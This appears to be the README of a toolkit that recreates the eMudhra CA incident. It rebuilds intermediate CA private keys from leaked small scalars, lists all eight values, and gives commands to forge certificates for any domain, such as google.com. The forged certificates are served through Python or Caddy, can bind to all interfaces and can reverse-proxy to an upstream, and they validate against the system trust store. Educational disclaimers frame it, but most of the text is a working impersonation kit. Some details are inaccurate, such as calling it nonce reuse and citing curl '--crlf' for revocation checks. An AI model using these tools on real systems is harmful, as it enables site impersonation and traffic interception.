# eMudhra weak-CA playground

Recreate the eMudhra G3B/G3C incident locally: rebuild a CA private key from its
leaked, tiny `d` value, forge a leaf certificate for **any** domain, and serve it
over TLS so that `curl` verifies it against the **system trust store** — no `-k`,
no `--cacert`.

> ## ⚠️ For education purposes only
>
> This repository is a demonstration / lab environment for studying ECDSA
> nonce reuse and CA key recovery. The "forged" certificates, the simulated
> trust paths and the servers started here are **not** to be used in
> production. Everything happens on `localhost`, on high ports, with the CA key
> reconstructed by hand. **Educational use only.**

---

## Requirements

| Tool | Used for |
| --- | --- |
| `python3` (3.8+) | key derivation, extraction, HTTPS server — no third-party packages |
| `openssl` | CSRs, signing, verification, `s_client` |
| `curl` | trust-store test |
| `caddy` (optional) | only for `emudhra-caddy.sh` |
| `/etc/ssl/certs/ca-certificates.crt` | default trust store (override with `STORE=...`) |

---

## Quick start

```sh
# 1. unpack the public certificate material in dist/ into certs/ (one-off)
python3 extract_certs.py

# 2. look at all 8 recovered keys
./derive_ca_key.py --check-all

# 3. one domain in, trusted HTTPS out (python http.server)
./emudhra-https.sh localhost            # self-test + serve in the foreground
./emudhra-https.sh --test google.com    # self-test, then stop and exit

# 4. same thing with Caddy as the TLS terminator / reverse proxy
./emudhra-caddy.sh --test api.example.com --upstream http://localhost:8000
```

Then, in another shell:

```sh
curl --resolve google.com:8443:127.0.0.1 https://google.com:8443/status
openssl s_client -connect 127.0.0.1:8443 -servername google.com -brief
```

---

## The pieces

### `derive_ca_key.py` — key recovery
Recovers the CA private key from the leaked small scalar `d` using plain
secp384r1 arithmetic (no crypto libraries), and writes a PKCS#8 key PEM.

```sh
./derive_ca_key.py 4                                  # -> PKCS#8 PEM on stdout
./derive_ca_key.py 156 -o ca.key --verify certs/em-dv-tls-ca-g3b.pem
./derive_ca_key.py --check-all                        # table of all 8 keys
./derive_ca_key.py --info ov-g3c                      # shell vars for scripts
```

Available slugs (`d` from the public announcement):

| slug | `d` | CA |
| --- | --- | --- |
| `ov-g3c` *(default)* | 4 | EM OV TLS CA - G3C |
| `dv-g3b` | 156 | EM DV TLS CA - G3B |
| `dv-g3c` | 230 | EM DV TLS CA - G3C |
| `ev-g3b` | 115 | EM EV TLS CA - G3B |
| `ev-g3c` | 56 | EM EV TLS CA - G3C |
| `ov-g3b` | 155 | EM OV TLS CA - G3B |
| `ov-cs-g3b` | 66 | EM OV CS CA - G3B |
| `ov-cs-g3c` | 237 | EM OV CS CA - G3C |

### `extract_certs.py` — input material
Unpacks `dist/impacted-intermediates.json`, `dist/roots.json` and
`dist/chains.zip` into `certs/` (intermediates, their Sectigo/`aaa/` twins,
cross-signed roots and trust anchors in `certs/issuers/`).

### `emudhra-https.sh` — end to end with Python
Recover key → pick a chain to a still-included root → mint a leaf for the
domain → `openssl verify` against the store → serve with `serve.py` → `curl`
self-test + negative controls.

```sh
./emudhra-https.sh [options] DOMAIN

-c SLUG      weak CA to impersonate (see table; default ov-g3c)
-p PORT      TCP port (default 8443)
-a ADDR      bind address (default 0.0.0.0)
-d DIR       directory to serve (default ./www)
-u URL       reverse-proxy to this upstream instead of serving files
-k           keep an existing out/DOMAIN.SLUG directory
--foreground serve in the foreground after the self-test (default)
--background self-test, leave the server running, exit
--test       self-test, then stop the server and exit
-h           full help
```

### `emudhra-caddy.sh` — end to end with Caddy
Identical certificate steps; step 5 writes a `Caddyfile` instead of starting
Python, so content comes from a real upstream and Caddy only handles the TLS.

```sh
./emudhra-caddy.sh [options] DOMAIN

-c SLUG            weak CA (default ov-g3c)
-p PORT            port Caddy listens on (default 8443)
-a ADDR            interface Caddy binds (default 0.0.0.0)
-u URL             upstream web server (default http://localhost:8000)
-f FILE            where to write the Caddyfile
-k                 keep an existing output directory
--vhost            forward the upstream host in Host: instead of the SNI name
--generate-only    write the Caddyfile and exit
--foreground / --background / --test
-h                 full help
```

### `serve.py` — `http.server` over TLS
Plain `http.server` plus an `SSLContext`, loading the forged leaf, the real
intermediate and the cross-signed root. Can serve a directory or act as a
reverse proxy.

```sh
./serve.py --domain localhost --port 8443 \
           --cert out/localhost.dv-g3b/chain.pem \
           --key  out/localhost.dv-g3b/leaf.key

./serve.py --upstream http://localhost:8000 --dir ./www --list-certs
```

Useful endpoints answered locally even when proxying: `/status` (which leaf was
sent) and `/json`.

---

## Layout

```
certs/                 intermediates extracted from dist/ (+ aaa/ twins,
                       issuers/ roots & cross-signs, proof/ published signatures)
dist/                  public source material (JSON + chains.zip)
out/DOMAIN.SLUG/       generated per run (git-ignored):
  ca-recovered.key     CA private key rebuilt from d
  leaf.key leaf.pem    leaf for DOMAIN, signed by that CA key
  leaf.ext leaf.csr    extension file / CSR used to sign it
  chain.pem            leaf + intermediate + cross-signed root (what the server sends)
  pos.sig              proof-of-possession signature
  Caddyfile caddy.log  caddy variant only
  server.pid caddy.pid pid of a --background server
www/index.html         default content served over TLS
```

Stop a backgrounded server with:

```sh
kill $(cat out/google.com.ov-g3c/server.pid)   # python variant
kill $(cat out/google.com.ov-g3c/caddy.pid)    # caddy variant
```

---

## Notes & caveats

* The path still lands on a root that is present in the store (`emSign ECC Root
  CA - G3` via the cross-sign, or `AAA Certificate Services` for the `ov-cs-*`
  keys). Once those CA certificates are removed from your store, the store check
  in step 4 starts failing — the script tells you so.
* `curl` does **not** check revocation by default, which is why the revoked
  intermediates still validate here. Add `--crlf`/OCSP yourself if you want to
  see the real-world breakage.
* `out/*/ca-recovered.key` is a real, usable CA private key: do not commit it,
  do not ship it.
* Default trust store path is `/etc/ssl/certs/ca-certificates.crt`; on other
  distros use e.g. `STORE=/etc/pki/ca-trust/extracted/pem/tls-ca-bundle.pem ./emudhra-https.sh example.com`.
* Again: **educational use only** — nothing here is a production PKI deployment.
